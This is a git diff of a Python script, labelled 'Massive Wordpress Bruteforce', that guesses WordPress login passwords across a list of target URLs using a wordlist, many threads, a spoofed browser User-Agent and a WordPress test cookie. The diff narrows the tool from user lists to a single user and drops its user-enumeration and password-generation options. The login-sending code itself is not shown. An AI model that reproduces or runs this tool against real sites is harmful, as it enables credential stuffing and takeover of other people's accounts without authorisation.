@@ -1,15 +1,12 @@
 from multiprocessing.pool import ThreadPool
-import requests, os.path, re, argparse
+import requests, os.path,  argparse
 
 
 parser = argparse.ArgumentParser(description = 'Massive Wordpress Bruteforce -  Pype')
 parser.add_argument('-urls',action='store',dest='URL_LST',required=True,help="Arquivo com as urls")
-parser.add_argument('-u',action='store',dest='USR_LST',required=True,help="List de Usuarios")
-parser.add_argument('-w',action='store',dest='WRD_LST',required=True,help="Wordlist")
+parser.add_argument('-u',action='store',dest='user',required=True,help="Usuario")
+parser.add_argument('-w',action='store',dest='WRD_LIST',required=True,help="Wordlist")
 parser.add_argument('-t',action='store',dest='threads',required=True,help="Numero de Threads")
-parser.add_argument('-e',action='store',dest='userenum',required=False,help="Enumeracao de Usuario")
-parser.add_argument('-p',action='store',dest='passgen',required=False,help="Comutador de senha (Gera senhas baseadas em dados do site")
-
 
 args = parser.parse_args()
 
@@ -58,10 +55,9 @@ def main():
 if __name__ == '__main__':
 
 
-    if os.path.exists(args.URL_LST) and os.path.exists(args.WRD_LST) AND os.path.exists(args.USR_LST):
+    if os.path.exists(args.URL_LST) and os.path.exists(args.WRD_LIST):
         URLS = open(args.URL_LST,"r").read().split()
-        PASS = open(args.WRD_LST,"r").read().split()
-        USERS = open(args.USR_LST)
+        PASS = open(args.WRD_LIST,"r").read().split()
         UA = {"User-Agent":"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:54.0) Gecko/20100101 Firefox/54.0"}
         coo = {"wordpress_test_cookie":"WP+Cookie+check"}
 
